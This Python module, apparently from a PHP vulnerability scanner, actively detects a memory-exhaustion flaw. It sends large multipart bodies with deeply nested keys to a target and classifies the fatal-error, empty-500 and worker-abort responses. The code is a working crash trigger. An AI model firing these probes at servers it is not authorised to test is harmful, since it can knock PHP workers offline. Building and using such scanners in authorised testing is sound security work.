"""oomprobe.py — deteksi aktif OOM (metodologi assetnote/php2shell-scanner).

Bila versi PHP tersembunyi CDN dan verdict masih unknown/eol, probe pasif
tidak cukup. Modul ini mengirim probe multipart bertingkat (1 -> 8 -> 20 MiB)
dengan kunci nested-62 untuk memicu OOM di dalam parser multipart, lalu
membaca sinyal:

  fatal-in-parser        pesan "Allowed memory size ... in Unknown"
  empty-500-differential HTTP 500 kosong, berbeda dari request kontrol
  worker-abort           502/503/504 (worker FPM mati di belakang front)

False-positive yang dihindari: warning "POST Content-Length exceeds the limit"
(location juga "Unknown", tapi itu guard post_max_size — BUKAN bug).
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from .transport import Transport

# Tingkatan ukuran probe (MiB). Naik bertahap agar hemat & minim jejak.
PROBE_STEPS_MB = (1, 8, 20)
# Kedalaman nested array key untuk memperbesar alokasi parser.
NEST_DEPTH = 62

# Sinyal false-positive: post_max_size guard, bukan bug.
GUARD_RE = re.compile(r"POST Content-Length exceeds the limit", re.I)
# Sinyal positif: fatal OOM di dalam parser multipart (lokasi Unknown).
FATAL_OOM_RE = re.compile(
    r"Allowed memory size of\s+\d+\s+bytes exhausted.*?in\s+Unknown", re.I | re.S)


@dataclass
class OomResult:
    triggered: bool = False
    signal: str = ""            # fatal-parser | empty-500 | worker-abort | inconclusive
    guard_seen: bool = False
    detail: str = ""
    probes: list[dict] = field(default_factory=list)


def _nested_key(depth: int) -> str:
    """Bangun kunci multipart bersarang `a[a][a]...` sepanjang `depth`."""
    return "a" + "[a]" * depth


def _multipart(field_name: str, size_mb: int) -> bytes:
    """Susun body multipart berisi satu field berukuran `size_mb` MiB."""
    boundary = "----p2sOomProbe7f3a9c"
    payload = b"A" * (size_mb * 1024 * 1024)
    head = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field_name}"\r\n\r\n').encode()
    tail = f"\r\n--{boundary}--\r\n".encode()
    return head + payload + tail


def probe(url: str, t: Transport, timeout: int = 30) -> OomResult:
    """Jalankan probe OOM bertingkat. Read-only terhadap data target."""
    res = OomResult()

    # ① Request kontrol: status dasar tanpa beban.
    ctrl = t.get(url)
    ctrl_status = ctrl.status

    key = _nested_key(NEST_DEPTH)
    for mb in PROBE_STEPS_MB:
        body = _multipart(key, mb)
        headers = {
            "Content-Type": f"multipart/form-data; boundary=----p2sOomProbe7f3a9c",
            "Content-Length": str(len(body)),
        }
        try:
            r = t.post(url, data=body, headers=headers)
        except Exception as exc:
            res.probes.append({"mb": mb, "status": 0, "error": str(exc)})
            continue

        rec = {"mb": mb, "status": r.status, "len": len(r.body)}
        res.probes.append(rec)

        # Cek guard post_max_size dulu (false-positive, bukan bug).
        if GUARD_RE.search(r.body or ""):
            res.guard_seen = True
            continue

        # ② fatal OOM di dalam parser multipart.
        if FATAL_OOM_RE.search(r.body or ""):
            res.triggered = True
            res.signal = "fatal-parser"
            res.detail = f"fatal 'Allowed memory size ... in Unknown' at {mb} MiB"
            return res

        # ③ worker abort: 502/503/504 di belakang front.
        if r.status in (502, 503, 504):
            res.triggered = True
            res.signal = "worker-abort"
            res.detail = f"HTTP {r.status} at {mb} MiB (worker abort)"
            return res

        # ④ diferensial 500 kosong: kontrol tidak 500, probe 500 & body kosong.
        if (r.status == 500 and not (r.body or "").strip()
                and ctrl_status != 500):
            res.triggered = True
            res.signal = "empty-500"
            res.detail = f"empty HTTP 500 differential at {mb} MiB"
            return res

    # Tidak ada sinyal: memory_limit mungkin terlalu tinggi.
    res.signal = "inconclusive"
    res.detail = ("memory_limit too high to reach OOM (inconclusive)"
                  if not res.guard_seen else "post_max_size guard (NOT a bug signal)")
    return res
